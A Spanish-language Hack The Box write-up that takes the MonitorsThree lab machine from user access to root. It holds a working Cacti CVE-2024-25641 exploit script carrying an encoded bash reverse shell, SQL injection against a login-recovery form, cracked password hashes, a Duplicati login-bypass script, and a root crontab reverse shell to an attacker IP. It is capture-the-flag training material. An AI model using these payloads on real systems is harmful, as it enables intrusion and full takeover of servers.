---
description: >-
  Writeup de la máquina de dificultad media MonitorsThree de la página https://hackthebox.eu
title: Hack The Box - MonitorsThree | (Difficulty Medium) - Linux
date: 2025-01-26
categories: [Hack the Box, Writeup]
tags: [htb, hacking, hack the box, linux, medium, cacti, duplicati, writeup, redteam, pentesting]
image_post: true
image: https://github.com/user-attachments/assets/17fc44c9-d486-4d62-aee3-3b14956a7ded
---

## Useful Skills

* Web enumeration
* Subdomain enumeration
* Blind Error SQL Injection (EXTRACTVALUE FUNCTION)
* Abusing Cacti 1.2.26 Authentication Remote Command Execution (CVE-2024-25641)
* Information Lekeage (config.php)
* Cracking hashes (hashcat)
* SSH Local Port Forwarding
* Duplicati login bypass
* Create backup crontab tu gain root access (Duplicati)

## Enumeration

### TCP Scan

 ```bash
rustscan -a 10.10.11.30 --ulimit 5000 -g
10.10.11.30 -> [22,80]
```

```bash
nmap -p22,80 -sCV 10.10.11.30 -oN tcpScan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 12:16 CET
Nmap scan report for 10.10.11.30
Host is up (0.035s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 86:f8:7d:6f:42:91:bb:89:72:91:af:72:f3:01:ff:5b (ECDSA)
|_  256 50:f9:ed:8e:73:64:9e:aa:f6:08:95:14:f0:a6:0d:57 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://monitorsthree.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.13 seconds
```

### UDP Scan

 ```bash
nmap -sU --top-ports 1500 --min-rate 5000 -n -Pn 10.10.11.30 -oN udpScan
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-26 12:16 CET
Nmap scan report for 10.10.11.30
Host is up (0.035s latency).
Not shown: 1494 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
774/udp   closed acmaint_dbd
5050/udp  closed mmcc
9370/udp  closed unknown
17006/udp closed unknown
21568/udp closed unknown
27919/udp closed unknown

Nmap done: 1 IP address (1 host up) scanned in 0.89 seconds
```

> Hay que añadir el dominio monitorsthree.htb en el archivo de configuración /etc/hosts para que se puede resolver el nombre de dominio a la dirección IP 10.10.11.30
{: .prompt-tip }

### HTTP Enumeration

Whatweb reporta que se produce una redirección desde http://10.10.11.30 a http://monitorsthree.htb/, un email el cual es sales@monitorsthree.htb y un servidor Nginx 1.18.0

```bash
whatweb http://monitorsthree.htb/
http://monitorsthree.htb/ [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[sales@monitorsthree.htb], HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], IP[10.10.11.30], JQuery, Script, Title[MonitorsThree - Networking Solutions], X-UA-Compatible[IE=edge], nginx[1.18.0]
```

Accediendo a la página en http://monitorsthree.htb/ puedo observar una web de una empresa que se dedidca a soluciones de red y mejora de infraestructura de red para empresas

![imagen](https://github.com/user-attachments/assets/f381b208-226e-490b-816f-152ddc80be91)

Observo un panel de Login, accedo e intento introducir diferentes credenciales diferentes comunes sin éxito ninguno. También intento detectar si es vulnerable a inyección SQL pero no consigo obtener nada interesante.

![imagen](https://github.com/user-attachments/assets/4895d605-6f40-43e5-87c2-7619ddb8da46)

Observo que se dispone de una panel de Password recovery, donde se permite introducir un usuario existen en el sistema y al mismo se le envía un correo de recuperación

![imagen](https://github.com/user-attachments/assets/abceccd9-625e-441d-b1df-4fdc2e777368)

Introduzco el usuario admin y obtengo una respuesta correcta donde se indica que se ha enviado el correo de recuperación de contraseña.

![imagen](https://github.com/user-attachments/assets/c669a155-40d1-49b1-80ce-77036113e912)

Sin embargo si introduzco el usuario ju4ncaa obtengo un mensaje de error donde se indica que no se ha podido procesar la solicitud. Esto me hace saber que el usuario admin existe y que hay una via potencial de enumeración de usuarios.

![imagen](https://github.com/user-attachments/assets/d0b678a0-5ed9-4a83-9d87-c4d669cb8256)

Utilizo gobuster para realizar enumeración de directorios exhaustiva

```bash
gobuster dir -u http://monitorsthree.htb/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 100 -q
/login.php            (Status: 200) [Size: 4252]
/index.php            (Status: 200) [Size: 13560]
/images               (Status: 301) [Size: 178] [--> http://monitorsthree.htb/images/]
/admin                (Status: 301) [Size: 178] [--> http://monitorsthree.htb/admin/]
/css                  (Status: 301) [Size: 178] [--> http://monitorsthree.htb/css/]
/js                   (Status: 301) [Size: 178] [--> http://monitorsthree.htb/js/]
/forgot_password.php  (Status: 200) [Size: 3030]
/fonts                (Status: 301) [Size: 178] [--> http://monitorsthree.htb/fonts/]
```

Encuentro el directorio /admin, al intentar acceder obtengo un codigo de estado 403 Forbidden

![imagen](https://github.com/user-attachments/assets/f2cb742d-2433-48bc-b036-ce13925c569a)

Intento enumerar recursos y directorios dentro de /admin, observo que se redirige continuamente a login.php, menos /assets, /footer.php y /navbar.php

```bash
gobuster dir -u http://monitorsthree.htb/admin -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php -t 100 -q
/users.php            (Status: 302) [Size: 0] [--> /login.php]
/assets               (Status: 301) [Size: 178] [--> http://monitorsthree.htb/admin/assets/]
/footer.php           (Status: 200) [Size: 303]
/customers.php        (Status: 302) [Size: 0] [--> /login.php]
/db.php               (Status: 200) [Size: 0]
/logout.php           (Status: 302) [Size: 0] [--> /login.php]
/changelog.php        (Status: 302) [Size: 0] [--> /login.php]
/navbar.php           (Status: 200) [Size: 6248]
/dashboard.php        (Status: 302) [Size: 0] [--> /login.php]
/tasks.php            (Status: 302) [Size: 0] [--> /login.php]
```

Al acceder a http://monitorsthree.htb/admin/navbar.php consigo echar un vistazo parcial a la interfaz de administración

![imagen](https://github.com/user-attachments/assets/16e3a4b7-a415-4835-bf09-2af6a82f4bf1)

Utilizo wfuzz para realizar enumeración de subdominios

```bash
wfuzz -c --hw=982 --hc=404 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://monitorsthree.htb/ -H "Host: FUZZ.monitorsthree.htb"
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                              
=====================================================================
000000246:   302        0 L      0 W        0 Ch        "cacti" 
```

> Hay que añadir el dominio cacti.monitorsthree.htb en el archivo de configuración /etc/hosts para que se puede resolver el nombre de dominio a la dirección IP 10.10.11.30
{: .prompt-tip }

Al acceder a http://cacti.monitorsthree.htb observo un panel de login de cacti, también puedo observar debajo del formulario la versión de cacti, la cual es 1.2.26.

![imagen](https://github.com/user-attachments/assets/eb6e0959-916f-46fc-83b1-d2e36b575fd7)

> Sabiendo que es Cacti y que la versión es 1.2.26 puedo buscar información sobre posibles vulnerabilidades existentes
{: .prompt-info }

## Vulnerability analysis

### CVE-2024-25641 (Cacti 1.2.26 Authenticated RCE)

Una pequeña búsqueda en internet me permite dar con la vulnerabilidad CVE-2024-25641, se trata de una ejecución remota de comandos (RCE) disponiendo de un usuario autenticado.

* [NVD Explanation CVE-2024-25641](https://nvd.nist.gov/vuln/detail/CVE-2024-25641)

## Exploitation

### SQLi password recovery panel

Necesito disponder de un usuario autenticado para llevar a cabo la explotación de la ejecución remota de comandos, probe a realizar inyección SQL en el panel de login, pero no probe a testar si el panel de recuperación de contraseña es vulnerable a SQLi. Introduzco una comilla y obtengo una error de sintaxis SQL, lo cual me indica que es vulnerable

![imagen](https://github.com/user-attachments/assets/9640c304-164f-4f53-bb33-6450cceafa6f)

Utilizo order by para detectar cuantas columnas existen, existen nueve columnas.

![imagen](https://github.com/user-attachments/assets/91f07568-f8f8-45cf-a9a1-b8798319881f)

Intercepto la petición con BurpSuite y la envío al Repeater, al realizar union select observo que no se refleja ninguno de los datos en ninguna de las columnas

![imagen](https://github.com/user-attachments/assets/a0158dc9-dd61-443f-b169-66e1cfe35f17)

![imagen](https://github.com/user-attachments/assets/2f3f95e4-c612-45ca-ab26-b42a3dc63e1c)

Podría utilizar herramientas como SQLmap o Ghauri para automatizar la inyección SQL, pero existe una forma más rapida de realizar la inyección a través de la función EXTRACTVALUE(), esta función permite generar errores cuando se proporciona una consulta XPath malformada o con datos inesperados, revelando información de la base de datos.

![imagen](https://github.com/user-attachments/assets/e03ad5db-67de-4252-9124-553ce728c065)

![imagen](https://github.com/user-attachments/assets/7b289c5d-0f41-4d35-b35f-2796120c9714)

Comienzo enumerando las bases de datos existentes

![imagen](https://github.com/user-attachments/assets/1713f0d1-f7da-4cea-97b9-ad2d31d91688)

![imagen](https://github.com/user-attachments/assets/8ab7b9d2-c473-43a6-b0c5-d1074828cd1b)

![imagen](https://github.com/user-attachments/assets/32f8cfc5-3777-4482-970e-371539b0297c)

![imagen](https://github.com/user-attachments/assets/19db35c4-d152-4507-9bb3-03d0288b74f6)

Enumero las tablas de la base de datos monitorsthree_db, la tabla que me parece interesante es la de users

![imagen](https://github.com/user-attachments/assets/8ffea493-ed29-40dc-9725-b4e3281348a3)

![imagen](https://github.com/user-attachments/assets/58454fc3-3ed1-4b6a-8025-6f387d036420)

Enumero las columnas de la tabla users, las columnas que me interesan son la de username y password

![imagen](https://github.com/user-attachments/assets/11a8fe77-ad47-4d1b-997f-f789c245cd17)

![imagen](https://github.com/user-attachments/assets/507a4391-af3b-4970-bded-6f199946a5c7)

![imagen](https://github.com/user-attachments/assets/6505a287-6eda-4874-acb1-48dbe5b89a16)

![imagen](https://github.com/user-attachments/assets/231e9616-2edc-4651-8f02-e4e9c6014560)

Por ultimo obtengo los usuarios y sus contraseñas

![imagen](https://github.com/user-attachments/assets/b708f29d-236b-4e0d-85dc-862b042f1051)

![imagen](https://github.com/user-attachments/assets/1feb6853-00a5-4a91-81e6-bb4a8ea32055)

![imagen](https://github.com/user-attachments/assets/d9ad3867-6478-4356-b680-91947d74412e)

![imagen](https://github.com/user-attachments/assets/c880107b-d402-4ba4-a489-f7004c53d154)

![imagen](https://github.com/user-attachments/assets/a5754b8e-5fa9-4771-882b-668c3156144e)

![imagen](https://github.com/user-attachments/assets/ea93520d-a42f-426e-94d4-a2b492b39bc2)

![imagen](https://github.com/user-attachments/assets/9a432525-cc62-4e05-92af-b70671755abb)

![imagen](https://github.com/user-attachments/assets/2b5d72d3-dcfe-49ac-b43f-96d32a340252)

![imagen](https://github.com/user-attachments/assets/40cf8ecf-072b-400f-a0fc-e7219811197d)

![imagen](https://github.com/user-attachments/assets/658f497c-271a-459d-9816-ee4bc54eb18f)

![imagen](https://github.com/user-attachments/assets/96a70d25-46f9-4ba7-aebf-39f5eed78402)

![imagen](https://github.com/user-attachments/assets/80c9047f-ca66-4cc2-b0b9-db334ca4c296)

![imagen](https://github.com/user-attachments/assets/c8d01e6e-23c2-4371-8a11-fea6e2205564)

![imagen](https://github.com/user-attachments/assets/35bf181a-27b8-415c-b9cd-2fc2ba361fa7)

![imagen](https://github.com/user-attachments/assets/f02ddf29-11ea-4b1c-a4dc-cd02c548bac7)

![imagen](https://github.com/user-attachments/assets/8d311e7b-ed3d-4ddf-9542-bae0b78feabb)

![imagen](https://github.com/user-attachments/assets/92ee881d-11fd-4227-a72a-ae9835baafa1)

![imagen](https://github.com/user-attachments/assets/3bbb091a-6c51-4771-b640-28698753fba6)

La información que he obtenido es la siguiente:

```
admin:31a181c8372e3afc59dab863430610e8
dthompson:c585d01f2eb3e6e1073e92023088a3dd
janderson:e68b6eb86b45f6d92f8f292428f77ac
mwatson:b683cc128fe244b00f176c8a950f5
```

Utilizo hashes.com para intentar cracker las hashes, consigo obtener la contraseña del usuario admin, la cual es greencacti2001

![imagen](https://github.com/user-attachments/assets/72044e52-4f84-4a1c-9b6d-466611ad7cfc)

### Abusing Cacti 1.2.26 Authenticated RCE Vulnerability (CVE-2024-25641)

En GitHub encuentro un repositorio sobre la vulnerabilidad CVE-2024-25641 el cual me sirven de guía para realizar la explotación de forma manual y entender como funciona todo.

* [CVE-2024-25641](https://github.com/cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88)

![imagen](https://github.com/user-attachments/assets/bb79a05a-1b53-4f9b-a7c5-0563fa1a4f5e)

Una vez he iniciado sesión en cacti como el usuario admin me dirigo al apartado Import/Export y entro en Import Packages

![imagen](https://github.com/user-attachments/assets/e256a6fb-bbf7-4d91-8179-ff4108e41560)

Utilizo el payload proporcionado por el repositorio de GitHub, en este mismo modifico la variable $filedata donde introduzco una reverse shell en base64

```php
<?php
$xmldata = "<xml>
   <files>
       <file>
           <name>resource/shell.php</name>
           <data>%s</data>
           <filesignature>%s</filesignature>
       </file>
   </files>
   <publickey>%s</publickey>
   <signature></signature>
</xml>";
$filedata = "<?php system('echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xOTQvNDQ0NCAwPiYxJwo= | base64 -d | bash'); ?>";
$keypair = openssl_pkey_new();
$public_key = openssl_pkey_get_details($keypair)["key"];
openssl_sign($filedata, $filesignature, $keypair, OPENSSL_ALGO_SHA256);
$data = sprintf($xmldata, base64_encode($filedata), base64_encode($filesignature), base64_encode($public_key));
openssl_sign($data, $signature, $keypair, OPENSSL_ALGO_SHA256);
file_put_contents("test.xml", str_replace("<signature></signature>", "<signature>".base64_encode($signature)."</signature>", $data));
system("cat test.xml | gzip -9 > test.xml.gz");
?>
```

Ejecuto el archivo shell.php y obtengo el xml comprimido que debo de importar en cacti

```bash
php shell.php
```

Utilizo netcat para iniciar un listener por el puerto 4444 y obtener una reverse shell

```bash
nc -lvnp 4444
listening on [any] 4444 ...
```

Me dirigo al panel de cacti e importo test.xml.gz

![imagen](https://github.com/user-attachments/assets/0c6c9f5a-4251-44d8-a1ce-bdbef8828377)

Una vez importado me dirigo a /resource/shell.php y obtengo la reverse shell como el usuario www-data

![imagen](https://github.com/user-attachments/assets/2c195783-e904-46a0-8695-d115b9a914a7)

```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.194] from (UNKNOWN) [10.10.11.30] 54072
bash: cannot set terminal process group (1148): Inappropriate ioctl for device
bash: no job control in this shell
www-data@monitorsthree:~/html/cacti/resource$ whoami
www-data
```

## Post exploitation

### User Pivoting

Obtengo acceso al sistema como el usuario www-data, este es un usuario con bajo privilegios por lo que debo de buscar alguna manera de pivotar hacia otro usuario. Comenzaré visualizando cuales son los usuarios que existen en el sistema.

```bash
www-data@monitorsthree:~/html/cacti/resource$ grep sh$ /etc/passwd
root:x:0:0:root:/root:/bin/bash
marcus:x:1000:1000:Marcus:/home/marcus:/bin/bash
```

Revisando los directorios encuentro en /var/www/html/cacti/include un archivo config.php el cual contiene credenciales de acceso a la base de datos

```bash
www-data@monitorsthree:~/html/cacti/include$ grep -i user /var/www/html/cacti/include/config.php
 * Make sure these values reflect your actual database/host/user/password
$database_username = 'cactiuser';
$database_password = 'cactiuser';
#$rdatabase_username = 'cactiuser';
#$rdatabase_password = 'cactiuser';
 *		'X-ProxyUser-Ip',
```

Me conecto a MySQL como cactiuser y obtengo la contraseña del usuario marcus

```bash
www-data@monitorsthree:~/html/cacti/include$ mysql -u cactiuser -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 2642
Server version: 10.6.18-MariaDB-0ubuntu0.22.04.1 Ubuntu 22.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

```bash
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| cacti              |
| information_schema |
| mysql              |
+--------------------+
3 rows in set (0.001 sec)
```

```bash
MariaDB [(none)]> use cacti;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

```bash
MariaDB [cacti]> show tables;
+-------------------------------------+
| Tables_in_cacti                     |
+-------------------------------------+
| aggregate_graph_templates           |
| aggregate_graph_templates_graph     |
| aggregate_graph_templates_item      |
| aggregate_graphs                    |
| aggregate_graphs_graph_item         |
| aggregate_graphs_items              |
| automation_devices                  |
| automation_graph_rule_items         |
| automation_graph_rules              |
| automation_ips                      |
| automation_match_rule_items         |
| automation_networks                 |
| automation_processes                |
| automation_snmp                     |
| automation_snmp_items               |
| automation_templates                |
| automation_tree_rule_items          |
| automation_tree_rules               |
| cdef                                |
| cdef_items                          |
| color_template_items                |
| color_templates                     |
| colors                              |
| data_debug                          |
| data_input                          |
| data_input_data                     |
| data_input_fields                   |
| data_local                          |
| data_source_profiles                |
| data_source_profiles_cf             |
| data_source_profiles_rra            |
| data_source_purge_action            |
| data_source_purge_temp              |
| data_source_stats_daily             |
| data_source_stats_hourly            |
| data_source_stats_hourly_cache      |
| data_source_stats_hourly_last       |
| data_source_stats_monthly           |
| data_source_stats_weekly            |
| data_source_stats_yearly            |
| data_template                       |
| data_template_data                  |
| data_template_rrd                   |
| external_links                      |
| graph_local                         |
| graph_template_input                |
| graph_template_input_defs           |
| graph_templates                     |
| graph_templates_gprint              |
| graph_templates_graph               |
| graph_templates_item                |
| graph_tree                          |
| graph_tree_items                    |
| host                                |
| host_graph                          |
| host_snmp_cache                     |
| host_snmp_query                     |
| host_template                       |
| host_template_graph                 |
| host_template_snmp_query            |
| plugin_config                       |
| plugin_db_changes                   |
| plugin_hooks                        |
| plugin_realms                       |
| poller                              |
| poller_command                      |
| poller_data_template_field_mappings |
| poller_item                         |
| poller_output                       |
| poller_output_boost                 |
| poller_output_boost_local_data_ids  |
| poller_output_boost_processes       |
| poller_output_realtime              |
| poller_reindex                      |
| poller_resource_cache               |
| poller_time                         |
| processes                           |
| reports                             |
| reports_items                       |
| rrdcheck                            |
| sessions                            |
| settings                            |
| settings_tree                       |
| settings_user                       |
| settings_user_group                 |
| sites                               |
| snmp_query                          |
| snmp_query_graph                    |
| snmp_query_graph_rrd                |
| snmp_query_graph_rrd_sv             |
| snmp_query_graph_sv                 |
| snmpagent_cache                     |
| snmpagent_cache_notifications       |
| snmpagent_cache_textual_conventions |
| snmpagent_managers                  |
| snmpagent_managers_notifications    |
| snmpagent_mibs                      |
| snmpagent_notifications_log         |
| user_auth                           |
| user_auth_cache                     |
| user_auth_group                     |
| user_auth_group_members             |
| user_auth_group_perms               |
| user_auth_group_realm               |
| user_auth_perms                     |
| user_auth_realm                     |
| user_auth_row_cache                 |
| user_domains                        |
| user_domains_ldap                   |
| user_log                            |
| vdef                                |
| vdef_items                          |
| version                             |
+-------------------------------------+
113 rows in set (0.001 sec)
```

```bash
MariaDB [cacti]> describe user_auth;
+------------------------+-----------------------+------+-----+---------+----------------+
| Field                  | Type                  | Null | Key | Default | Extra          |
+------------------------+-----------------------+------+-----+---------+----------------+
| id                     | mediumint(8) unsigned | NO   | PRI | NULL    | auto_increment |
| username               | varchar(50)           | NO   | MUL | 0       |                |
| password               | varchar(256)          | NO   |     |         |                |
| realm                  | mediumint(8)          | NO   | MUL | 0       |                |
| full_name              | varchar(100)          | YES  |     | 0       |                |
| email_address          | varchar(128)          | YES  |     | NULL    |                |
| must_change_password   | char(2)               | YES  |     | NULL    |                |
| password_change        | char(2)               | YES  |     | on      |                |
| show_tree              | char(2)               | YES  |     | on      |                |
| show_list              | char(2)               | YES  |     | on      |                |
| show_preview           | char(2)               | NO   |     | on      |                |
| graph_settings         | char(2)               | YES  |     | NULL    |                |
| login_opts             | tinyint(3) unsigned   | NO   |     | 1       |                |
| policy_graphs          | tinyint(3) unsigned   | NO   |     | 1       |                |
| policy_trees           | tinyint(3) unsigned   | NO   |     | 1       |                |
| policy_hosts           | tinyint(3) unsigned   | NO   |     | 1       |                |
| policy_graph_templates | tinyint(3) unsigned   | NO   |     | 1       |                |
| enabled                | char(2)               | NO   | MUL | on      |                |
| lastchange             | int(11)               | NO   |     | -1      |                |
| lastlogin              | int(11)               | NO   |     | -1      |                |
| password_history       | varchar(4096)         | NO   |     | -1      |                |
| locked                 | varchar(3)            | NO   |     |         |                |
| failed_attempts        | int(5)                | NO   |     | 0       |                |
| lastfail               | int(10) unsigned      | NO   |     | 0       |                |
| reset_perms            | int(10) unsigned      | NO   |     | 0       |                |
+------------------------+-----------------------+------+-----+---------+----------------+
25 rows in set (0.002 sec)
```

```bash
MariaDB [cacti]> select username,password from user_auth;
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| admin    | $2y$10$tjPSsSP6UovL3OTNeam4Oe24TSRuSRRApmqf5vPinSer3mDuyG90G |
| guest    | $2y$10$SO8woUvjSFMr1CDo8O3cz.S6uJoqLaTe6/mvIcUuXzKsATo77nLHu |
| marcus   | $2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK |
+----------+--------------------------------------------------------------+
3 rows in set (0.000 sec)
```

A simple vista observo que esta hasheado en bcrypt, utilizo hashcat para crackearlo y obtener la contraseña de marcus, la cual es 12345678910

```bash
hashcat -m 3200 -a 0 '$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK' /usr/share/wordlists/rockyou.txt
$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910
```

Intento migrar el usuario marcus con la contraseña obtenida, puediendo obtener acceso de manera existosa

```bash
www-data@monitorsthree:~/html/cacti/resource$ su marcus
Password: 
marcus@monitorsthree:/var/www/html/cacti/resource$ whoami
marcus
```

### Privilege escalation

Utilizo el comando netstat para mostrar información sobre las conexiones de red y puertos en uso

```bash
marcus@monitorsthree:~$ netstat -tulpen
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      0          32512      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          34916      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      102        29226      -                   
tcp        0      0 127.0.0.1:8200          0.0.0.0:*               LISTEN      0          37203      -                   
tcp        0      0 0.0.0.0:8084            0.0.0.0:*               LISTEN      33         35167      -                   
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      114        35017      -                   
tcp        0      0 127.0.0.1:36077         0.0.0.0:*               LISTEN      0          32581      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      0          32518      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      0          34918      -                   
udp        0      0 127.0.0.53:53           0.0.0.0:*                           102        29225      -                   
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          33226      -  
```

Visualizo que se encuentra el puerto 8200 el cual no se veía en el escaneo de inicial de puertos, observo tambien que lo corre el usuario con UID 0, es decir root, utilizo ssh para realizar un Local Port Forwarding, pero al intentarlo obtengo que necesito autenticarme con clave ssh.

```bash
ssh -L 8200:127.0.0.1:8200 marcus@10.10.11.30
marcus@10.10.11.30: Permission denied (publickey).
```

Utilizo un servidor en Python3 para traer a mi equipo la clave del usuario marcus y así poder realizar el Local Port Forwarding.

```bash
marcus@monitorsthree:~/.ssh$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
wget http://10.10.11.30:8000/id_rsa
--2025-01-27 14:53:56--  http://10.10.11.30:8000/id_rsa
Connecting to 10.10.11.30:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2610 (2,5K) [application/octet-stream]
Saving to: ‘id_rsa’
```

Utilizo ssh con la clave id_rsa de marcus para realizar un local port forwarding y traer el puerto 8200 de la máquina a mi puerto 8200.

```bash
ssh -L 8200:127.0.0.1:8200 marcus@10.10.11.30 -i id_rsa -fN
```

Accedo al puerto 8200 y observo un panel de Login de Duplicati

![imagen](https://github.com/user-attachments/assets/74f17044-57a1-43a2-a423-85a3341a0737)

Buscando información sobre como explotar Duplicati la primera búsqueda que obtengo es un artículo de como bypassear la autenticación del login

* [Duplicati: Bypassing Login Authentication With Server-passphrase](https://read.martiandefense.llc/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee)

![imagen](https://github.com/user-attachments/assets/1dcba326-593d-41ba-ab31-44fb41e4b451)

> Duplicati es un cliente de copia de seguridad que almacena de forma segura Backups encriptados, incrementales y comprimidos en almacenamiento local, servicios de almacenamiento en la nube y servidores de archivos remotos.
{: .prompt-info }

El primer paso es encontrar un archivo SQLite el cual contiene los datos relacionados con Duplicati.

```bash
marcus@monitorsthree:~$ find / -name *.sqlite 2>/dev/null
/opt/duplicati/config/Duplicati-server.sqlite
/opt/duplicati/config/CTADPNHLTC.sqlite
/opt/duplicati/config/XPZCVKDBST.sqlite
/opt/duplicati/config/RMDKIFCLFY.sqlite
/opt/duplicati/config/HORORWQEWI.sqlite
/opt/duplicati/config/ALMLZANKDB.sqlite
```
 
Con un servidor en Python3 traslado a mi máquina de atacante el archivo Duplicati-server.sqlite

```bash
marcus@monitorsthree:/opt/duplicati/config$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
wget http://10.10.11.30:8000/Duplicati-server.sqlite
--2025-01-27 18:20:57--  http://10.10.11.30:8000/Duplicati-server.sqlite
Connecting to 10.10.11.30:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 90112 (88K) [application/vnd.sqlite3]
Saving to: ‘Duplicati-server.sqlite’
```

Abro el .sqlite y consigo visualizar el server-passphrase y server-passphrase-salt, esto me servirá para generar una contraseña de inicio de sesión válida

![imagen](https://github.com/user-attachments/assets/e4883b90-d5b0-43ad-9216-af0237ad9b99)

Intercepto la petición de login con BurpSuite con la opción "Do intercept > Response to this request", el Salt coincide con el de la base de datos de Duplicati, pero el Nonce va cambiando cada vez que se introduce una contraseña.

![imagen](https://github.com/user-attachments/assets/4863c055-9379-4a53-896f-b62fee844e27)

Crearé un NoncePwd válido usando CyberChef decodificando el server-passphrase en base64 y el resultado convirtiendolo a hexadecimal 

![imagen](https://github.com/user-attachments/assets/19eb3e8c-4d63-4e6e-8cbe-c1398057880f)

Utilizo el siguiente script en NodeJS y reemplazo los valores de este código, lo que me permite obtener el NoncePwd

```js
const CryptoJS = require('crypto-js');

var saltedpwd = 'HexOutputFromCyberChef';
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('NonceFromBurp') + saltedpwd)).toString(CryptoJS.enc.Base64);

console.log(noncedpwd);
```

```bash
node duplicati.js
ZyuEFXAeiRLOS/bJ5WhMs65SnXEOo4k/d8FgRTzP8U=
```

Forward en la petición de BurpSuite y pego el NoncePwd en el campo password

![imagen](https://github.com/user-attachments/assets/68b926fa-1cb2-4bc2-9b23-af846ea0f51b)

> Después de pegar el NoncePwd en el campo password usar (Ctrl+U) para URL encodearlo en BurpSuite
{: .prompt-info }

Dejo correr la petición y obtengo acceso al panel de Duplicati

![imagen](https://github.com/user-attachments/assets/2cc802c7-4454-48e2-9fe2-fa2e1c6cc5eb)

Por último crearé una copia de seguridad de de un archivo malicioso el cual contiene un crontab que ejecuta cada minutos una reverse sell hacía mi máquina de atacante.

```bash
marcus@monitorsthree:/tmp$ cat rce 
* * * * * root /bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.14.194/1234 0>&1"
```

Utilizo netcat para iniciar un listener por el puerto 1234 y obtener una reverse shell

```bash
nc -lvnp 1234
listening on [any] 1234 ...
```

Configuro un nuevo backup en Duplicati y seguido restauro

![imagen](https://github.com/user-attachments/assets/ca089566-8bbd-4618-8ec3-4c3a7d3e97c1)

![imagen](https://github.com/user-attachments/assets/c9e3db1d-6005-441d-a8f5-38a59ed8c539)

![imagen](https://github.com/user-attachments/assets/373d1160-0b9e-40d6-be64-44faacd6192c)

![imagen](https://github.com/user-attachments/assets/f068d048-7bfb-4cc7-825c-d61e03bac67b)

![imagen](https://github.com/user-attachments/assets/7113dec4-9112-4d2e-866d-fcea3532976e)

![imagen](https://github.com/user-attachments/assets/ecc6eb1f-ebcb-4f80-8ba9-c351a58fa2af)

![imagen](https://github.com/user-attachments/assets/aa17850a-114e-4458-a453-17ad9b32af75)

![imagen](https://github.com/user-attachments/assets/927ca398-a02b-4e44-a7e0-b32842be0805)

![imagen](https://github.com/user-attachments/assets/3bbe7ea0-9511-47e0-9536-ce07f1963c8e)

![imagen](https://github.com/user-attachments/assets/2b42fa33-ad10-41ba-ba89-0dbda5822cec)

Obtengo la reverse shell como el usuario root

```bash
nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.14.194] from (UNKNOWN) [10.10.11.30] 33954
bash: cannot set terminal process group (7600): Inappropriate ioctl for device
bash: no job control in this shell
root@monitorsthree:~# whoami
root
```
